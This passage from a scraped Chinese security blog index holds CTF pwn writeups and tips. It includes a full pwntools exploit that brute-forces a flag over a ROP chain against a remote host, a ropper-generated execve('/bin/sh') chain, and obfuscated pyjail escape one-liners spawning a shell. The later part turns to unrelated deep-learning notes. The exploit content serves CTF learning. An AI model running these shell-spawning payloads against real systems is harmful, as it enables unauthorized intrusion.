[r12+rbx*8]，我们可以将r12的值设为read的got值，rbx为0，这样就能执行read函数\n当我们执行完read函数时，因为物理相邻的缘故，我们会比较rbp和rbx的值，\n所以我们要设置rbp不等于rbx\n然后我们就进入了csu1，这里有一串的pop，加上头部的add，一共我们要设置56个字节来跳过这些指令到ret\n然后我们设置一下rdi和rsi就转到call strcmp\n最后我们再填入一个pause的syscall就可以了，如果程序没有退出就会调用pause而停掉\n但问题来了，我们要怎么将我们想要与flag比较的字符输入进来呢？\n我们可以在读入invitation code的时候将需要比较的字符输入进来：\n所以rop chain为：\n# 计算代码基址 pie_base = u64(io.recv(6).ljust(8, b\u0026#39;\\x00\u0026#39;)) - (0x561d75601161 - 0x561d75600000) # strcmp、read strcmp_plt = pie_base + elf.plt[\u0026#39;strcmp\u0026#39;] read_plt = pie_base + elf.plt[\u0026#39;read\u0026#39;] read_got = pie_base + elf.got[\u0026#39;read\u0026#39;] # 设置rdi、rsi pop_rdi = pie_base + 0x00000000000011a3 pop_rsi_r15 = pie_base + 0x00000000000011a1 # syscall;ret syscall = pie_base + 0x00000000000009f5 # 有一个gadget可以设置rdx为0xa # set_rdx_10 = pie_base + 0x00000000000009f7 # 一大堆pop，设置寄存器 csu1 = pie_base + 0x000000000000119A # 将csu中设置的寄存器的值转移到其他寄存器 csu2 = pie_base + 0x0000000000001180 # bss节开始位置 bss_start = pie_base + 0x0000000000202020 # \u0026#34;./flag\\x00\u0026#34;字符串保存的位置 flag_str_addr = pie_base + 0x000000000020207a # 尝试的字符保存的位置 try_chr_addr = pie_base + 0x000000000020207f # 读入的flag文件内容保存的位置 target_chr_addr = bss_start + 0x300 # 测试strcmp成不成功的gadget test_gadget = pie_base + 0x00000000000099b # 设置rax为2 set_rax_2 = flat([ # open pop_rdi, pie_base + 0x00000000000011E7, pop_rsi_r15, pie_base + 0x00000000000015A0, 0, strcmp_plt ]) # 设置rax为0x22 set_rax_0x22 = flat([ # pause pop_rdi, pie_base + 0x00000000000011EF, pop_rsi_r15, pie_base + 0x00000000000015A0, 0, strcmp_plt ]) # 读入解码内容、\u0026#34;./flag\\x00\u0026#34;字符串、当前尝试的字符 io.sendafter(\u0026#39; code\\n\u0026#39;, flat([base64.b64decode( \u0026#39;ZjFhZ3tYU0NURi0yMDIyLWdvLWdvLWdvfQ==\u0026#39;), \u0026#39;\\x00flag\\x00\u0026#39;, try_c])) rop_chain = flat([ # 2号syscall，打开文件 set_rax_2, pop_rdi, flag_str_addr, pop_rsi_r15, 0, 0, syscall, # 读取文件内容 csu1, 0, 1, read_got, 0, # edi target_chr_addr, # rsi flag_len + 1, # rdx csu2, \u0026#39;a\u0026#39; * 56, # 比对字符 pop_rdi, try_chr_addr, pop_rsi_r15, target_chr_addr + flag_len, # 第flag_len个字符 0, strcmp_plt, test_gadget, # pause系统调用 set_rax_0x22, syscall ]) 设置延时器，保证程序正常执行 可以使用sleep函数、recv(0.5)还有signal模块来拖时间，等待程序进一步执行\nsignal模块\ndef handler(signum, frame): raise TimeoutError() signal.signal(signal.SIGALRM, handler) signal.alarm(1) try: io.recvuntil(\u0026#39;Okay, \u0026#39;) signal.alarm(0) signal.signal(signal.SIGALRM, signal.SIG_DFL) except: signal.alarm(0) signal.signal(signal.SIGALRM, signal.SIG_DFL) io.close() return False 这个模块设置在一秒之后发送TimeoutError异常，但如果在这一秒内recv到了'Okay，'，那就取消发送，否则关闭远程/停止进程\n这段代码保证了程序在一秒内正确执行（不正确执行的都死了）\nrecv(0.5)\ntry: io.recv(timeout=0.5) io.close() return True except: io.close() return False 如果在0x5秒内程序退出了，就说明没有执行pause系统调用，所以就关闭远程/停止进程\n为第9个字符单独写rop chain 因为我们的rop chain中有一条flag_len+1，而当我们爆破第九个字符时这个值为0xa，刚好和\\n的ASCII码一样，所以会发生截断，因此0xa不能出现在rop chain中\n而我们注意到syscall的gadget后面会自动将rdx设置为0xa： 那么我们直接常规思路调用read即可，不需要用到csu：\nif flag_len == 9: rop_chain = flat([ set_rax_2, pop_rdi, flag_str_addr, pop_rsi_r15, 0, 0, syscall, pop_rdi, 0, pop_rsi_r15, target_chr_addr, 0, read_plt, pop_rdi, try_chr_addr, pop_rsi_r15, target_chr_addr + flag_len, 0, strcmp_plt, test_gadget, set_rax_0x22, syscall ]) 完整exp from pwn import * import base64 import signal context.arch = \u0026#39;amd64\u0026#39; elf = ELF(\u0026#39;club\u0026#39;) def handler(signum, frame): raise TimeoutError() def pwn(try_c, flag_len): # io = process(\u0026#39;./club\u0026#39;) # io = remote(\u0026#39;127.0.0.1\u0026#39;, 9999) io = remote(\u0026#39;43.248.98.206\u0026#39;, 10075) io.sendafter(\u0026#39; is XS-Club, your name?\\n\u0026#39;, \u0026#39;a\u0026#39;) signal.signal(signal.SIGALRM, handler) signal.alarm(1) try: io.recvuntil(\u0026#39;Okay, \u0026#39;) signal.alarm(0) signal.signal(signal.SIGALRM, signal.SIG_DFL) except: signal.alarm(0) signal.signal(signal.SIGALRM, signal.SIG_DFL) io.close() return False pie_base = u64(io.recv(6).ljust(8, b\u0026#39;\\x00\u0026#39;)) - \\ (0x561d75601161 - 0x561d75600000) strcmp_plt = pie_base + elf.plt[\u0026#39;strcmp\u0026#39;] read_plt = pie_base + elf.plt[\u0026#39;read\u0026#39;] read_got = pie_base + elf.got[\u0026#39;read\u0026#39;] pop_rdi = pie_base + 0x00000000000011a3 pop_rsi_r15 = pie_base + 0x00000000000011a1 syscall = pie_base + 0x00000000000009f5 csu1 = pie_base + 0x000000000000119A csu2 = pie_base + 0x0000000000001180 bss_start = pie_base + 0x0000000000202020 flag_str_addr = pie_base + 0x000000000020207a try_chr_addr = pie_base + 0x000000000020207f target_chr_addr = bss_start + 0x300 test_gadget = pie_base + 0x00000000000099b set_rax_2 = flat([ # open pop_rdi, pie_base + 0x00000000000011E7, pop_rsi_r15, pie_base + 0x00000000000015A0, 0, strcmp_plt ]) set_rax_0x22 = flat([ # pause pop_rdi, pie_base + 0x00000000000011EF, pop_rsi_r15, pie_base + 0x00000000000015A0, 0, strcmp_plt ]) io.sendafter(\u0026#39; code\\n\u0026#39;, flat([base64.b64decode( \u0026#39;ZjFhZ3tYU0NURi0yMDIyLWdvLWdvLWdvfQ==\u0026#39;), \u0026#39;\\x00flag\\x00\u0026#39;, try_c])) rop_chain = flat([ set_rax_2, pop_rdi, flag_str_addr, pop_rsi_r15, 0, 0, syscall, csu1, 0, 1, read_got, 0, # edi target_chr_addr, # rsi flag_len + 1, # rdx csu2, \u0026#39;a\u0026#39; * 56, pop_rdi, try_chr_addr, pop_rsi_r15, target_chr_addr + flag_len, 0, strcmp_plt, test_gadget, set_rax_0x22, syscall ]) if flag_len == 9: rop_chain = flat([ set_rax_2, pop_rdi, flag_str_addr, pop_rsi_r15, 0, 0, syscall, pop_rdi, 0, pop_rsi_r15, target_chr_addr, 0, read_plt, pop_rdi, try_chr_addr, pop_rsi_r15, target_chr_addr + flag_len, 0, strcmp_plt, test_gadget, set_rax_0x22, syscall ]) io.sendlineafter(\u0026#39; leave your phone number here\\n\u0026#39;, flat({0x28: rop_chain})) sleep(0.1) io.recvuntil(\u0026#39;~\\nNow you can join the club, go crazy!!! *\\\\(^o^)/*\\n\u0026#39;) try: io.recv(timeout=0.5) io.close() return True except: io.close() return False table = string.printable + \u0026#34;\\n\u0026#34; flag = \u0026#39;\u0026#39; t = time.time() while True: for c in table: if pwn(c, len(flag)): flag += c break if flag.endswith(\u0026#39;}\u0026#39;): success(flag) success(flat([\u0026#39;time: \u0026#39;, str(round(time.time() - t, 2)), \u0026#39;s\u0026#39;])) break else: info(flag) with open(\u0026#34;out\u0026#34;, \u0026#34;a\u0026#34;, encoding=\u0026#39;UTF-8\u0026#39;) as f: f.write(flag + \u0026#34;\\n\u0026#34;) info(flat([\u0026#39;time: \u0026#39;, str(round(time.time() - t, 2)), \u0026#39;s\u0026#39;])) sleep(0.1) ","date":"2022年12月29日","permalink":"https://peterliuzhi.top/writeup/%E6%9A%A8%E5%8D%97%E5%A4%A7%E5%AD%A62022%E6%96%B0%E7%94%9F%E8%B5%9B%E5%88%9D%E8%B5%9B-%E9%9D%9E%E5%AE%98%E6%96%B9writeup/","section":"writeup","summary":"It is not so much our friends\u0026rsquo; help that helps us, as the confidence of their help. — Epicurus 原题链接 EasyEasyEasy 因为读入的是一个有符号数，所以当输入-1 的时候也是合法的 而我们知道，-1%256 也是-1，而v5[-1","tags":["pwn"],"title":"暨南大学2022新生赛初赛 非官方WriteUp"},{"categories":["tricks"],"contents":" The extreme limit of wisdom, that\u0026rsquo;s what the public calls madness. — Jean Cocteau\n查看程序架构 ida伪代码 exp 这题手工构造ropchain比较困难，但是我们可以利用ropper或者ROPgadget的ropchain功能来生成：\nropper ROPgadget exp 需要注意的是，工具生成的代码和我们日常使用的代码格式和风格上都有一定差距，从struct包中导入的pack函数也会和pwntools中的pack起冲突，如果一定要使用struct的pack，就在导入pwntools后再导入struct，这样就可以覆盖掉pack\n# 自动生成头部 from pwn import * from pwn import p64, p32, u32, u64, p8 from LibcSearcher import LibcSearcher import ctypes from struct import pack pss: bool = True fn: str = \u0026#34;./rop\u0026#34; libc_name: str = \u0026#34;\u0026#34; port: str = \u0026#34;27311\u0026#34; if_32: bool = True if_debug: bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; break main c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # 两个elf，注意libc的版本 m_elf = ELF(fn) # libc = ELF(libc_name) def suclog(**kwargs): for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None, timeout: float = 0.05, no_show: bool = False) -\u0026gt; bytes: if until is not None: p.recvuntil(flat(until)) received = p.clean(timeout) if not no_show: info(f\u0026#34;received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.send(flat(content)) return received def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None, timeout: float = 0.05, no_show: bool = False) -\u0026gt; bytes: send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout: int = 0.05, no_show: bool = False): received = p.clean(timeout) if not no_show: info(f\u0026#34;received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;无法转换{value}或不存在类型{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True, is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;÷\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... # 需要自行设定offset offset: int = 0xC + 4 # Generated by ropper ropchain generator # # 487729c3b55aaec43deb2af4c896b16f9dbd01f7e484054d1bb7f24209e2d3ae IMAGE_BASE_0 = 0x08048000 def rebase_0(x): return pg(x + IMAGE_BASE_0) rop = b\u0026#39;\u0026#39; rop += rebase_0(0x00070016) # 0x080b8016: pop eax; ret; rop += b\u0026#39;/bin\u0026#39; rop += rebase_0(0x00026cda) # 0x0806ecda: pop edx; ret; rop += rebase_0(0x000a2060) rop += rebase_0(0x0000c66b) # 0x0805466b: mov dword ptr [edx], eax; ret; rop += rebase_0(0x00070016) # 0x080b8016: pop eax; ret; rop += b\u0026#39;/sh\\x00\u0026#39; rop += rebase_0(0x00026cda) # 0x0806ecda: pop edx; ret; rop += rebase_0(0x000a2064) rop += rebase_0(0x0000c66b) # 0x0805466b: mov dword ptr [edx], eax; ret; rop += rebase_0(0x00070016) # 0x080b8016: pop eax; ret; rop += pg(0x00000000) rop += rebase_0(0x00026cda) # 0x0806ecda: pop edx; ret; rop += rebase_0(0x000a2068) rop += rebase_0(0x0000c66b) # 0x0805466b: mov dword ptr [edx], eax; ret; rop += rebase_0(0x000001c9) # 0x080481c9: pop ebx; ret; rop += rebase_0(0x000a2060) rop += rebase_0(0x00096769) # 0x080de769: pop ecx; ret; rop += rebase_0(0x000a2068) rop += rebase_0(0x00026cda) # 0x0806ecda: pop edx; ret; rop += rebase_0(0x000a2068) rop += rebase_0(0x00070016) # 0x080b8016: pop eax; ret; rop += pg(0x0000000b) rop += rebase_0(0x00027430) # 0x0806f430: int 0x80; ret; payload = flat({offset: rop}) sendline_after_clean(payload) interactive_after_clean() ","date":"2022年12月29日","permalink":"https://peterliuzhi.top/tricks/%E4%BD%BF%E7%94%A8ropgadgetropper%E5%B7%A5%E5%85%B7%E6%9E%84%E5%BB%BAropchain/","section":"tricks","summary":"The extreme limit of wisdom, that\u0026rsquo;s what the public calls madness. — Jean Cocteau 查看程序架构 ida伪代码 exp 这题手工构造ropchain比较困难，但是我们可以利用ropper或者ROPgadget的rop","tags":["pwn","ROPgadget","ropper","ropchain"],"title":"使用ROPgadget、ropper工具构建ropchain"},{"categories":null,"contents":"","date":"2022年12月29日","permalink":"https://peterliuzhi.top/stats/stats/","section":"stats","summary":"","tags":null,"title":"统计"},{"categories":["tricks"],"contents":" Kindness is the golden chain by which society is bound together. — Johann Wolfgang von Goethe\n如何查看当前系统libc版本 如何查看当前系统libc版本 查看当前系统的libc版本 查看程序当前默认使用的libc版本 查看当前系统的libc版本 strings /lib/x86_64-linux-gnu/libc.so.6 | grep \u0026#34;GNU C Library\u0026#34; 自动化脚本 使用命令行参数指定libc\n#!/bin/bash if [ -z \u0026#34;$*\u0026#34; ]; then strings /lib/x86_64-linux-gnu/libc.so.6 | grep \u0026#34;GNU C Library\u0026#34; else strings $@ | grep \u0026#34;GNU C Library\u0026#34; fi 查看程序当前默认使用的libc版本 ldd -v \u0026lt;程序名\u0026gt; ","date":"2022年12月28日","permalink":"https://peterliuzhi.top/tricks/%E5%A6%82%E4%BD%95%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E7%B3%BB%E7%BB%9Flibc%E7%89%88%E6%9C%AC/","section":"tricks","summary":"Kindness is the golden chain by which society is bound together. — Johann Wolfgang von Goethe 如何查看当前系统libc版本 如何查看当前系统libc版本 查看当前系统的libc版本 查看程序当前默认使用的libc版本 查","tags":["pwn","libc"],"title":"如何查看当前系统libc版本"},{"categories":["tricks"],"contents":" Never give up, for that is just the place and time that the tide will turn. — Harriet Beecher Stowe\n先输入空格就好了，atoi会跳过空格\n","date":"2022年12月27日","permalink":"https://peterliuzhi.top/tricks/%E7%BB%95%E8%BF%87atoi%E5%89%8D%E5%AF%B9%E9%A6%96%E5%AD%97%E7%AC%A6%E6%98%AF%E5%90%A6%E4%B8%BA%E8%B4%9F%E5%8F%B7%E7%9A%84%E6%A3%80%E6%9F%A5/","section":"tricks","summary":"Never give up, for that is just the place and time that the tide will turn. — Harriet Beecher Stowe 先输入空格就好了，atoi会跳过空格","tags":["pwn","atoi"],"title":"绕过atoi前对首字符是否为负号的检查"},{"categories":["tricks"],"contents":" Happiness cannot be travelled to, owned, earned, worn or consumed. Happiness is the spiritual experience of living every minute with love, grace and gratitude. — Denis Waitley\n基础版 __import__(\u0026#39;os\u0026#39;).system(\u0026#39;sh\u0026#39;) 进阶版 getattr(getattr(getattr(getattr(().__class__,chr(95)+chr(95)+chr(98)+chr(97)+chr(115)+chr(101)+chr(95)+chr(95)),chr(95)+chr(95)+chr(115)+chr(117)+chr(98)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(101)+chr(115)+chr(95)+chr(95))()[-4],chr(95)+chr(95)+chr(105)+chr(110)+chr(105)+chr(116)+chr(95)+chr(95)),chr(95)+chr(95)+chr(103)+chr(108)+chr(111)+chr(98)+chr(97)+chr(108)+chr(115)+chr(95)+chr(95))[chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)](chr(115)+chr(104)) 如果知道flag文件的名字，可以用:\nopen(chr(102)+chr(108)+chr(97)+chr(103)).read() 更多资料参见https://zhuanlan.zhihu.com/p/578986988\n","date":"2022年12月23日","permalink":"https://peterliuzhi.top/tricks/%E7%BB%95%E8%BF%87pyjail%E4%B8%80%E5%8F%A5%E8%AF%9Drce/","section":"tricks","summary":"Happiness cannot be travelled to, owned, earned, worn or consumed. Happiness is the spiritual experience of living every minute with love, grace and gratitude. — Denis Waitley 基础版 __import__(\u0026#39;os\u0026#39;).system(\u0026#39;sh\u0026#39;) 进阶版 getattr(getattr(getattr(getattr(().__class__,chr(95)+chr(95)+chr(98)+chr(97)+chr(115)+chr(101)+chr(95)+chr(95)),chr(95)+chr(95)+chr(115)+chr(117)+chr(98)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(101)+chr(115)+chr(95)+chr(95))()[-4],chr(95)+chr(95)+chr(105)+chr(110)+chr(105)+chr(116)+chr(95)+chr(95)),chr(95)+chr(95)+chr(103)+chr(108)+chr(111)+chr(98)+chr(97)+chr(108)+chr(115)+chr(95)+chr(95))[chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)](chr(115)+chr(104)) 如果知道flag文件的名字，可以用: open(chr(102)+chr(108)+chr(97)+chr(103)).read() 更多资料参见https://zhuanla","tags":["web","pyjail"],"title":"绕过pyjail——一句话RCE"},{"categories":["principle","Introduction"],"contents":" Every great dream begins with a dreamer. Always remember, you have within you the strength, the patience, and the passion to reach for the stars to change the world. — Harriet Tubman\nDeepLearning 基本框架 梯度:下山最快的方向 Loss函数 梯度到底是啥? 基本框架 整个神经网络就是一个函数\n每一个点都是一个神经元，每一个神经元的每一次传导都有自己的权重(weight)和偏置(bias)，最后乘上激活函数(activation function)来模拟生物神经元的激活 梯度:下山最快的方向 Question:应该如何调整weight和bias才能最快减少网络判断结果和真实结果之间的差距？\n先引入几个概念\nLoss函数 对最后判定的值\r而言，它与真实值y有一定差距 为表达误差,我们定义Loss函数:\r,亦称为平方损失(square loss) 整个Loss函数为: 而使该Loss函数最小的参数记为: 梯度到底是啥? definition:梯度的本意是一个向量（矢量），表示某一函数在该点处的方向导数沿着该方向取得最大值，即函数在该点处沿着该方向（此梯度的方向）变化最快，变化率最大（为该梯度的模）。\n梯度下降法（英语：Gradient descent）是一个一阶最优化算法，通常也称为最陡下降法，但是不该与近似积分的最陡下降法（英语：Method of steepest descent）混淆。 要使用梯度下降法找到一个函数的局部极小值，必须向函数上当前点对应梯度（或者是近似梯度）的反方向的规定步长距离点进行迭代搜索。如果相反地向梯度正方向迭代进行搜索，则会接近函数的局部极大值点；这个过程则被称为梯度上升法。\n因此每一次梯度下降就好像下山(降低Loss),等到达山谷的最低处(Loss的最低处)就达到了训练的目的\n","date":"2022年11月16日","permalink":"https://peterliuzhi.top/principle/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/introduction/deeplearning%E4%BB%8B%E7%BB%8D/","section":"principle","summary":"Every great dream begins with a dreamer. Always remember, you have within you the strength, the patience, and the passion to reach for the stars to change the world. — Harriet Tubman DeepLearning 基本框架 梯度:下山最快的方向 Loss函数 梯度到底是啥? 基本框架 整个神经网络就是一个函","tags":["deeplearning","intro"],"title":"DeepLearning介绍"},{"categories":["principle","SimpleImplement"],"contents":" The attempt to combine wisdom and power has only rarely been successful and then only for a short while. — Albert Einstein\n线性回归的简单实现 定义函数 定义模型函数(X*W+b) 定义 Loss 函数1/2(y_hat - y)^2，计算网络所得结果和真实结果中间的差距 定义优化函数，调整 weight 和 bias 定义数据选取函数，随机选取小批次数据（随机梯度下降法） 定义生成 weight 和 bias 的随机函数 定义训练函数 执行训练 定义函数 定义模型函数(X*W+b) 注意，因为这是线性回归模型，不需要引入非线性，自然也不用引入激活函数\n# 定义模型（函数）,此处的模型是最基本的矩阵乘法 def linMul(x,w,b): return torch.mm(x,w) + b 定义 Loss 函数1/2(y_hat - y)^2，计算网络所得结果和真实结果中间的差距 # 定义Loss函数 def Loss(y_hat, y): # 1/2*(y_hat - y)^2 return (y_hat - y.view(y_hat.size()))**2/2 定义优化函数，调整 weight 和 bias # 定义优化算法 def sgd(params, lr, batch_size): # params是weight和bias的列表 for param in params: param.data -= lr*param.grad / batch_size 定义数据选取函数，随机选取小批次数据（随机梯度下降法） # 定义数据及其迭代器 # 把数据分批次 def data_iter(features: torch.tensor, batch_size:int, labels:torch.tensor): total_size = len(features) # print(f\u0026#34;total size:{total_size}\u0026#34;) indexes = list(range(0,total_size)) random.shuffle(indexes) for i in range(0, total_size, batch_size): choice = torch.tensor(indexes[i:min(i+batch_size, total_size)]) yield features.index_select(0,choice), labels.index_select(0,choice) 定义生成 weight 和 bias 的随机函数 maker = lambda x,y,z: torch.tensor([[round(ele.item(),10) for ele in np.random.normal(0,x,y)]],dtype=torch.float32, requires_grad=z) 定义训练函数 # 定义训练函数 def train(num_epoches, lr, features, batch_size, labels, hat_w, hat_b, true_w, true_b): for epoch in range(num_epoches): for x,y in data_iter(features, batch_size, labels): lab_tmp = linMul(x, hat_w.T, hat_b) # print(lab_tmp) l = Loss(lab_tmp, y).sum() l.backward() sgd([hat_w, hat_b], lr, batch_size) hat_w.grad.data.zero_() hat_b.grad.data.zero_() train_l = Loss(linMul(features, hat_w.T, hat_b), labels).sum() print(f\u0026#34;epoch {epoch}, loss:{train_l}\u0026#34;) print(f\u0026#34;true weight:{true_w}, hat weight:{hat_w}\u0026#34;) print(f\u0026#34;true bias:{true_b}, hat bias:{hat_b}\u0026#34;) 执行训练 def main(): # 先定义真正的w\u0026amp;b，还有应该得到的结果 true_w = maker(10,2,False) true_b = maker(5,1,False) print(f\u0026#34;true weight:{true_w}, true bias:{true_b}\u0026#34;) #定义1000个数据(特征值) features = torch.randn((1000, 2)) print(f\u0026#34;features:{features}\u0026#34;) # 定义真值 labels = linMul(features, true_w.T, true_b) # 初始化参数 hat_w = maker(0.01,2,True) hat_b = maker(0.01,1,True) # 定义学习率和迭代次数 lr = 0.03 num_epoches = 10 train(num_epoches, lr, features, 10, labels, hat_w, hat_b, true_w, true_b) ","date":"2022年11月16日","permalink":"https://peterliuzhi.top/principle/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/simpleimplement/linearregression/","section":"principle","summary":"The attempt to combine wisdom and power has only rarely been successful and then only for a short while. — Albert Einstein 线性回归的简单实现 定义函数 定义模型函数(X*W+b) 定义 Loss 函数1/2(y_hat - y)^2，计算网络所得结","tags":["deeplearning","线性回归","completion"],"title":"LinearRegression"},{"categories":["principle","softmax"],"contents":" Imagination is more important than knowledge. For while knowledge defines all we currently know and understand, imagination points to all we might yet discover and create. — Albert Einstein\nsoftmax 回归概述 softmax 回归是什么 Softmax 公式 Softmax 回归的 Loss 函数——交叉熵损失函数 softmax 回归是什么 有时候我们的输出值不是一个值，而是一串离散的值（比如识别手写数字），这时候我们不能简单地线性地表示结果（线性的结果可以任意大，难以判断此时应该是哪一个离散的值，线性值与离散值之间的误差也难以衡量），这时候我们就需要将结果表示为概率，将所有值压缩在$(0,1]$间\n这时候就需要所谓的逻辑函数(sigmod 函数)，不同的是，softmax 在输出结果等于 2 时退化回逻辑回归\n原博客地址\nsoftmax 函数和之前的线性函数一样，是全连接层的，也就是说，它的每一个结点都与上一层的所有结点相连\nSoftmax 公式 对所有结果取指数相加作为整体，再用单个节点的指数除以这个整体就是该节点的概率\n$$ \\hat{y_{1}},\\hat{y_{2}},\\hat{y_{3}} = softmax(o_{1},o_{2},o_{2}), $$\n$$ \\hat{y_{j}} = \\frac{exp(o_{j})}{\\sum_{i=1}^{3}exp(o_{i})} (j = 1,2,3) $$\n因此模型公式为：\n$$ \\hat{Y} = softmax(XW+b) $$\nSoftmax 回归的 Loss 函数——交叉熵损失函数 因为平方差损失函数总是要求模拟结果和预期结果完全拟合，对 Softmax 回归这种多个输出计算概率的回归过于严格，因此应该采用一种只要某一节点的概率远高于其他节点就判定拟合的 Loss 函数，因此我们采用交叉熵损失函数： 对第 i 组数据：\n$$ H(y^{(i)}, \\hat{y}^{(i)}) = -\\sum_{j=1}^{q} y_{j}^{(i)}\\log {\\hat{y}_{j}^{(i)}},其中j为模拟的第j个节点 $$\n因此 Loss 函数是：\n$$ l(\\Theta) = \\frac{1}{n} \\sum_{i=1}^{n} H(y^{(i)}, \\hat{y}^{(i)}) = \\frac{1}{n} \\sum_{i=1}^{n} y_{j}^{(i)}\\log {\\hat{y}_{j}^{(i)}},其中n为当前批次的数据个数 $$\n又因为每个结果的真实值（概率）不是 0 就是 1，且只有一个节点真实值为 1，所以所谓的\n$$ -\\sum_{j=1}^{q} y_{j}^{(i)}\\log {\\hat{y}_{j}^{(i)}} $$\n其实只有一项，为\n$$ -y_{k}^{(i)} \\log {\\hat{y}_{k}^{(i)}}=-\\log {\\hat{y}_{k}^{(i)}} $$\n其中 k 为概率为 1 的节点 k\n因此交叉熵损失函数就是真节点（概率为 1 的节点）的模拟值的对数之和的均值的负数\n同时我们也可以看到，Loss 函数等价于：\n$$ exp(nl(\\Theta)) = \\prod_{i=1}^{n} \\hat{y}_{k}^{(i)} $$\n因此最小化交叉熵损失函数等价于最大化训练数据集所有标签类别的联合预测概率\n感谢奔跑的小仙女的博客\n","date":"2022年11月16日","permalink":"https://peterliuzhi.top/principle/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/softmax/softmax-intro/","section":"principle","summary":"Imagination is more important than knowledge. For while knowledge defines all we currently know and understand, imagination points to all we might yet discover and create. — Albert Einstein softmax 回归概述 softmax 回归是什么 Softmax 公式 Softmax 回归的 Loss 函数——交叉熵损失函数 softmax 回归是什么 有时候我们的输出值不","tags":["deeplearning","softmax"],"title":"softmax intro"},{"categories":["principle","softmax"],"contents":" True friendship is like sound health; the value of it is seldom known until it is lost. — Charles Caleb Colton\nsoftmax 简单实现 需要导入的库 定义需要的函数 定义模型函数 定义交叉熵损失函数 定义准确率 定义优化算法 定义数据分批的函数 训练函数 测试训练成果 开始训练 训练结果 需要导入的库 import torch import torchvision import numpy as np import torchvision.transforms as transforms 定义需要的函数 一次统计学习由学习的模型，学习的策略，学习的算法组成\n定义模型函数 定义 softmax 函数，将非线性引入线性回归之中\n# 定义softmax def softmax(Oi: torch.Tensor): Oi_exp = Oi.exp() return Oi_exp/(Oi_exp.sum(dim=1, keepdim=True)) # 定义模型 def net(X: torch.Tensor, W: torch.Tensor, b: torch.Tensor): return softmax(torch.mm(X.view((-1, W.size()[0])), W)+b) 定义交叉熵损失函数 形式上是对数损失函数\n依靠经验误差对模型进行选择\n# 定义Loss函数 # 